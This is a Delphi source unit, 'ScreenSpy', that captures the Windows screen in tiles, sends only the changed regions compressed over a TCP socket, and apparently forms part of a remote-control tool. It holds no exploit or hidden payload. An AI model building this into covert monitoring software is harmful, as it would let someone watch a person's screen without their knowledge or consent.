{*******************************************}
{      DGScreenSpy - ScreenSpy              }
{      Version: 0.4c                        }
{      Author:  BCB-DG                      }
{      EMail:   iamgyg@163.com              }
{      QQ:      112275024                   }
{      Blog:    http://iamgyg.blog.163.com  }
{*******************************************}
unit ScreenSpy;

interface

uses
  Windows, MySysutils, MyClasses, MyGraphics, MySocket, ZLibEx;

const
  BSIZE = 16;
  BNUMS = BSIZE * BSIZE;

type
  PSpyCmd = ^TSpyCmd;
  TSpyCmd = packed record
    Cmd:  Byte;
    Size: Integer;
  end;

  PCtlCmd = ^TCtlCmd;
  TCtlCmd = packed record
    Cmd:  Byte;
    X, Y: Word;
  end;

  TScreenSpy = class(TThread)
  private
    FSocket: TDXTCPClient;
    FmsScr, FmsSend: TMemoryStream;
    FWidth, FHeight, FBWidth, FBHeight, FSize: Integer;
    FBmps:  array[0..BNUMS] of TBitmap;
    FFocus: array[0..BNUMS - 1] of Integer;
    FFlag1: array[0..BNUMS - 1] of Boolean;
    FFlag2: array[0..BNUMS - 1] of Boolean;
    FDC: HDC;
    FCmd: TSpyCmd;
    FPixelFormat: TPixelFormat;
    //
    function CheckScr: Boolean;
    procedure SendData(nCmd: Byte);
    procedure GetFirst;
    procedure GetNext;
  protected
    procedure Execute; override;
  public
    constructor Create; reintroduce;
    destructor Destroy; override;
    //
    property Socket: TDXTCPClient read FSocket write FSocket;
    property PixelFormat: TPixelFormat read FPixelFormat write FPixelFormat;
  end;

implementation

function CompareMem(P1, P2: Pointer; Length: Integer): Boolean; assembler;
asm
        PUSH    ESI
        PUSH    EDI
        MOV     ESI,P1
        MOV     EDI,P2
        MOV     EDX,ECX
        XOR     EAX,EAX
        AND     EDX,3
        SAR     ECX,2
        JS      @@1
        REPE    CMPSD
        JNE     @@2
        MOV     ECX,EDX
        REPE    CMPSB
        JNE     @@2
@@1:    INC     EAX
@@2:    POP     EDI
        POP     ESI
end;

constructor TScreenSpy.Create;
var
  i: Integer;
begin
  FreeOnTerminate := True;
  FmsScr  := TMemoryStream.Create;
  FmsSend := TMemoryStream.Create;
  FWidth  := 0;
  FHeight := 0;
  FPixelFormat := pf8bit;
  for i := 0 to BNUMS do FBmps[i] := TBitmap.Create;
  inherited Create(True);
end;

destructor TScreenSpy.Destroy;
var
  i: Integer;
begin
  FmsScr.Free;
  FmsSend.Free;
  for i := 0 to BNUMS do FBmps[i].Free;
  inherited;
end;

procedure TScreenSpy.Execute;
begin
  try
    while ((not Terminated) and FSocket.Connected) do
    begin
      try
        if CheckScr then GetFirst else GetNext;
      except
      end;
      Sleep(30);
    end;
  except
  end;
end;

function TScreenSpy.CheckScr: Boolean;
var
  nWidth, nHeight, i: Integer;
begin
  Result  := False;
  nWidth  := GetSystemMetrics(SM_CXSCREEN);
  nHeight := GetSystemMetrics(SM_CYSCREEN);
  if (nWidth <> FWidth) or (nHeight <> FHeight) then
  begin
    FWidth  := nWidth;
    FHeight := nHeight;
    FBWidth := (FWidth + BSIZE - 1)  div BSIZE;
    FBHeight:= (FHeight + BSIZE - 1) div BSIZE;
    for i := 0 to BNUMS do
    begin
      FBmps[i].Width  := FBWidth;
      FBmps[i].Height := FBHeight;
      FBmps[i].PixelFormat := FPixelFormat;
    end;
    case FPixelFormat of
      pf1bit:  FSize := BytesPerScanline(FBWidth, 1, 32) * FBHeight;
      pf4bit:  FSize := BytesPerScanline(FBWidth, 4, 32) * FBHeight;
      pf8bit:  FSize := BytesPerScanline(FBWidth, 8, 32) * FBHeight;
      pf16bit: FSize := BytesPerScanline(FBWidth, 16, 32) * FBHeight;
      pf24bit: FSize := BytesPerScanline(FBWidth, 24, 32) * FBHeight;
      pf32bit: FSize := BytesPerScanline(FBWidth, 32, 32) * FBHeight;
    else
      FSize := BytesPerScanline(FBWidth, 8, 32) * FBHeight;
    end;
    Result := True;
  end;
end;

procedure TScreenSpy.GetFirst;
var
  rt: TRect;
  i, l, t: Integer;
begin
  FmsScr.Clear;
  FDC := GetDC(0);
  for i := 0 to BNUMS - 1 do
  begin
    l := (i mod BSIZE) * FBWidth;
    t := (i div BSIZE) * FBHeight;
    BitBlt(FBmps[i].Canvas.Handle, 0, 0, FBWidth, FBHeight, FDC, l, t, SRCCOPY);
    SetRect(rt, l, t, l + FBWidth, t + FBHeight);
    FmsScr.WriteBuffer(rt, SizeOf(rt));
    FBmps[i].SaveToStream(FmsScr);
  end;
  ReleaseDC(0, FDC);
  SendData(1);
  FillChar(FFocus, SizeOf(FFocus), #0);
end;

procedure TScreenSpy.GetNext;
var
  pt: TPoint;
  rt: TRect;
  i, l, t: Integer;
begin
  FmsScr.Clear;
  for i := 0 to BNUMS - 1 do
  begin
    FFlag1[i] := FFocus[i] > 0;
    FFlag2[i] := False;
  end;
  GetCursorPos(pt);
  FFlag1[pt.X div FBWidth + pt.Y div FBHeight * BSIZE] := True;
  FDC := GetDC(0);
  i := 0;  
  while ( i < BNUMS) do
  begin
    if (FFlag1[i] and (not FFlag2[i])) then
    begin
      FFlag2[i] := True;
      l := (i mod BSIZE) * FBWidth;
      t := (i div BSIZE) * FBHeight;
      FBmps[BNUMS].Canvas.Lock;
      try
        BitBlt(FBmps[BNUMS].Canvas.Handle, 0, 0, FBWidth, FBHeight, FDC, l, t, SRCCOPY);
      finally
        FBmps[BNUMS].Canvas.Unlock;
      end;
      if CompareMem(FBmps[i].ScanLine[FBHeight - 1], FBmps[BNUMS].ScanLine[FBHeight - 1], FSize) then
        FFocus[i] := Max(FFocus[i] - 1, 0)
      else
      begin
        FBmps[i].Canvas.Lock;
        try
          BitBlt(FBmps[i].Canvas.Handle, 0, 0, FBWidth, FBHeight, FDC, l, t, SRCCOPY);
        finally
          FBmps[i].Canvas.Unlock;
        end;
        FFocus[i] := 5;
        SetRect(rt, l, t, l +  FBWidth, t + FBHeight);
        FmsScr.WriteBuffer(rt, SizeOf(rt));
        FBmps[i].SaveToStream(FmsScr);
        if ((i - BSIZE) >= 0) then FFlag1[i - BSIZE] := True;
        if ((i + BSIZE) <= (BNUMS - 1)) then FFlag1[i + BSIZE] := True;
        if ((i mod BSIZE) <> 0) then FFlag1[i - 1] := True;
        if ((i mod BSIZE) <> (BSIZE - 1)) then FFlag1[i + 1] := True;
        i := Max(Min(i - BSIZE, i - 1), 0);
        Continue;
      end;
    end;
    Inc(i);
  end;
  ReleaseDC(0, FDC);
  if (FmsScr.Size > 0) then SendData(2);
end;

procedure TScreenSpy.SendData(nCmd: Byte);
begin
  try
    FmsSend.Clear;
    FmsScr.Position := 0;
    ZCompressStream(FmsScr, FmsSend);
    FmsSend.Position := 0;
    FCmd.Cmd := nCmd;
    FCmd.Size := FmsSend.Size;
    FSocket.WriteBuffer(FCmd, SizeOf(TSpyCmd));
    FSocket.WriteBuffer(FmsSend.Memory^, FmsSend.Size);
  except
  end;
end;

end.